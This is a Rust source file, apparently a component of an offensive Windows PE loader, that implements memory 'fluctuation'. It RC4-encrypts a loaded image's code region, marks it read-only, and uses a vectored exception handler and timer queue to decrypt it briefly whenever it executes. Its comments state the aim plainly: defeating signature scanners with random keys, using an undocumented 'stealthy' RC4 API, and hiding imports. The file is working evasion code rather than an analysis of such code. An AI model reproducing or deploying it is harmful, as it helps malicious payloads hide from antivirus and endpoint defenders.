use std::ffi::c_void;
use std::ptr::{self, addr_of, addr_of_mut};
use log::{debug, error, info};

// Windows API Imports
use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS, STATUS_SUCCESS};
use windows_sys::Win32::Foundation::EXCEPTION_ACCESS_VIOLATION;
use windows_sys::Win32::System::Diagnostics::Debug::{AddVectoredExceptionHandler, EXCEPTION_POINTERS};
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
use windows_sys::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_READONLY, PAGE_READWRITE};
use windows_sys::Win32::System::Threading::{CreateTimerQueue, CreateTimerQueueTimer};
use windows_sys::Win32::Security::Cryptography::{BCryptGenRandom, BCRYPT_USE_SYSTEM_PREFERRED_RNG};

/// The duration (in milliseconds) the code remains in an executable (decrypted) state
/// after being accessed before it is automatically re-encrypted.
const EXEC_WAIT_MS: u32 = 1000;

// --- Global State ---
// We use static mut globals because the Vectored Exception Handler (VEH) and
// Timer Callbacks are called by the Windows Kernel/Thread Pool and do not
// allow passing custom Rust context objects.
//
// NOTE: We use addr_of! macros to access these to comply with Rust 2024 safety rules.
static mut G_PE_RX_ADDRESS: usize = 0;
static mut G_PE_RX_SIZE: usize = 0;
static mut G_TIMER_QUEUE: HANDLE = ptr::null_mut();
static mut G_TIMER: HANDLE = ptr::null_mut();

// Dynamic RC4 Key: Randomizing this on every execution prevents static signature
// detection of the encrypted memory region.
static mut G_RC4_KEY: [u8; 16] = [0; 16];

/// Minimal representation of a Windows Unicode String (UString/ANSI_STRING variant)
/// required by the SystemFunction032 (RC4) API.
#[repr(C)]
struct UString {
    length: u32,
    maximum_length: u32,
    buffer: *mut u8,
}

/// Type definition for the undocumented Advapi32 SystemFunction032.
/// This is used because it provides a stealthy, built-in RC4 implementation
/// that doesn't require adding external dependencies to the binary.
type FnSystemFunction032 = unsafe extern "system" fn(*mut UString, *mut UString) -> NTSTATUS;

/// Initializes the fluctuation mechanism for a specific memory region.
///
/// Decision: This sets up a "trap." We encrypt the code and set it to Read-Only.
/// When the loaded PE tries to execute, it triggers an exception which we catch
/// to temporarily decrypt the code.
pub unsafe fn initialize_fluctuation(rx_base: usize, rx_size: usize) -> Result<(), u32> {
    if rx_base == 0 || rx_size == 0 {
        return Ok(());
    }

    info!("fluctuation: initializing on range [0x{:X} - 0x{:X}]", rx_base, rx_base + rx_size);

    // Initialize globals using raw pointer writes to avoid mutable reference errors
    addr_of_mut!(G_PE_RX_ADDRESS).write(rx_base);
    addr_of_mut!(G_PE_RX_SIZE).write(rx_size);

    // 1. Generate a random session key using Windows CNG.
    // This ensures memory scanners cannot look for a hardcoded "encryption key" signature.
    let status = BCryptGenRandom(
        ptr::null_mut(),
        addr_of_mut!(G_RC4_KEY) as *mut u8,
        16,
        BCRYPT_USE_SYSTEM_PREFERRED_RNG,
    );

    if status != STATUS_SUCCESS {
        return Err(windows_sys::Win32::Foundation::GetLastError());
    }

    // 2. Register a Vectored Exception Handler (VEH).
    // Decision: VEH is preferred over SEH because it is the first handler called by
    // the OS, allowing us to intercept the "Access Violation" before anyone else.
    let veh = AddVectoredExceptionHandler(1, Some(vectored_exception_handler));
    if veh.is_null() {
        return Err(windows_sys::Win32::Foundation::GetLastError());
    }

    // 3. Create a timer queue to manage the re-encryption cycle.
    let queue = CreateTimerQueue();
    addr_of_mut!(G_TIMER_QUEUE).write(queue);

    if queue.is_null() {
        return Err(windows_sys::Win32::Foundation::GetLastError());
    }

    // Start initial encryption after a tiny delay to allow the PE to finish initialization.
    let success = CreateTimerQueueTimer(
        addr_of_mut!(G_TIMER),
        queue,
        Some(obfuscation_timer_callback),
        ptr::null_mut(),
        100,
        0,
        0,
    );

    if success == 0 {
        return Err(windows_sys::Win32::Foundation::GetLastError());
    }

    Ok(())
}

/// Callback triggered by the Windows Timer Queue.
///
/// Its job is to encrypt the memory region and set its protection to Read-Only (RO).
/// This "arms the trap" for the next time the code is executed.
unsafe extern "system" fn obfuscation_timer_callback(_param: *mut c_void, _timer_or_wait_fired: bool) {
    let addr = addr_of!(G_PE_RX_ADDRESS).read();
    let size = addr_of!(G_PE_RX_SIZE).read();

    if let Err(e) = rc4_encrypt_decrypt(addr, size, false) {
        error!("fluctuation: encryption failed: {}", e);
    } else {
        debug!("fluctuation: region encrypted (PAGE_READONLY)");
    }
}

/// The core logic of the fluctuation technique.
///
/// When an Access Violation (0xC0000005) occurs in our managed range:
/// 1. We decrypt the memory.
/// 2. Change protection to Execute-Read (RX).
/// 3. Resume execution (the CPU retries the instruction successfully).
/// 4. Schedule a timer to re-encrypt the code after 5 seconds of "quiet" time.
unsafe extern "system" fn vectored_exception_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    let rec = &*(*exception_info).ExceptionRecord;

    if rec.ExceptionCode as u32 == EXCEPTION_ACCESS_VIOLATION as u32 {
        let fault_addr = rec.ExceptionInformation[1] as usize;
        let rx_addr = addr_of!(G_PE_RX_ADDRESS).read();
        let rx_size = addr_of!(G_PE_RX_SIZE).read();

        if fault_addr >= rx_addr && fault_addr < (rx_addr + rx_size) {
            debug!("fluctuation: handling trap at 0x{:X}", fault_addr);

            // Decrypt region for execution
            if rc4_encrypt_decrypt(rx_addr, rx_size, true).is_ok() {
                let mut new_timer: HANDLE = ptr::null_mut();
                let ok = CreateTimerQueueTimer(
                    &mut new_timer,
                    addr_of!(G_TIMER_QUEUE).read(),
                    Some(obfuscation_timer_callback),
                    ptr::null_mut(),
                    EXEC_WAIT_MS,
                    0,
                    0
                );

                if ok != 0 {
                    addr_of_mut!(G_TIMER).write(new_timer);
                    // Tell Windows to retry the execution
                    return windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_CONTINUE_EXECUTION;
                }
            }
        }
    }

    windows_sys::Win32::System::Diagnostics::Debug::EXCEPTION_CONTINUE_SEARCH
}

/// Performs in-place RC4 encryption/decryption using Windows SystemFunction032.
///
/// Decision: We use VirtualProtect to transition to PAGE_READWRITE for the
/// duration of the RC4 operation, then transition to the final state (RX or RO).
unsafe fn rc4_encrypt_decrypt(base: usize, len: usize, decrypt: bool) -> Result<(), String> {
    if base == 0 || len == 0 { return Ok(()); }
    let ptr = base as *mut u8;

    let mut old_protect = 0;
    if VirtualProtect(ptr as _, len, PAGE_READWRITE, &mut old_protect) == 0 {
        return Err("VirtualProtect RW failed".into());
    }

    let mut key_s = UString {
        length: 16,
        maximum_length: 16,
        buffer: addr_of!(G_RC4_KEY) as *mut u8
    };
    let mut data_s = UString {
        length: len as u32,
        maximum_length: len as u32,
        buffer: ptr
    };

    // Dynamically load Advapi32 to keep the import table clean
    let h_mod = LoadLibraryA(b"Advapi32.dll\0".as_ptr());
    if !h_mod.is_null() {
        let func_addr = GetProcAddress(h_mod, b"SystemFunction032\0".as_ptr());
        if let Some(addr) = func_addr {
            let sys_func032: FnSystemFunction032 = std::mem::transmute(addr);
            sys_func032(&mut data_s, &mut key_s);
        }
    }

    // If decrypting, we need Execute rights. If encrypting, we want Read-Only to trigger the VEH trap.
    let new_protect = if decrypt { PAGE_EXECUTE_READ } else { PAGE_READONLY };
    VirtualProtect(ptr as _, len, new_protect, &mut old_protect);

    Ok(())
}